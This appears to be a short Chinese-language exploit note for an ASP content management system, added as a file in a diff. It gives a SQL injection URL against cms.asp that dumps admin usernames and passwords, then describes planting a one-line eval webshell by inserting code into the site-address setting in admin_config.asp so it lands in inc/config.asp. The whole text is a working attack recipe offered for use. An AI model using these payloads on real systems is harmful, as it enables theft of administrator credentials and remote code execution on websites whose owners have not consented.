@@ -1,0 +1,14 @@
+漏洞文件 cms.asp （代码省略）
+
+?漏洞利用：exp
+
+http://www.7747.net/cms.asp?action=getding&id=-1+union+select+username%2b'%3d'%2bpassword+from+admin
+
+后台拿webshell:
+
+admin/admin_config.asp
+
+网站地址：  插入 ":eval request("1"):'
+
+inc/config.asp  一句话后门
+
